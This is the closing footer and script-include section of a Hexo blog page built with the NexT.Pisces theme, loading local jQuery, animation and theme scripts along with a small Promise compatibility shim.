  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
